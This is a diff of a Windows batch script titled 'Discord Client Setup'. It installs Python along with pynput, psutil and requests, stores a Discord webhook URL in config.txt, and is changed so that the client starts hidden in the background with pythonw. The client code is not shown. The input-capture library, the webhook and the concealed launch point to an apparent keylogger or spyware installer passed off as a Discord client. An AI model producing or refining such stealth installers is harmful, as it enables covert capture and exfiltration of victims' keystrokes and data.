@@ -2,9 +2,7 @@
 title Discord Client Setup
 color 0A
 
-REM ===========================
-REM Step 1: Check for Python
-REM ===========================
+REM Step 1: Check Python
 python --version >nul 2>&1
 IF ERRORLEVEL 1 (
     echo [*] Python not found. Installing Python 3.12...
@@ -15,24 +13,16 @@ IF ERRORLEVEL 1 (
     echo [+] Python is already installed.
 )
 
-REM ===========================
 REM Step 2: Install requirements
-REM ===========================
-echo [*] Installing required Python packages...
 python -m pip install --upgrade pip
 python -m pip install pynput psutil requests
 
-REM ===========================
 REM Step 3: Ask for Discord webhook
-REM ===========================
 set /p WEBHOOK=Enter your Discord webhook URL: 
 echo %WEBHOOK% > config.txt
 echo [+] Webhook saved to config.txt
 
-REM ===========================
-REM Step 4: Start client
-REM ===========================
-echo [*] Starting client...
-python client.py
-
+REM Step 4: Start hidden client
+start "" pythonw client.pyw
+echo [+] Client started in background.
 pause
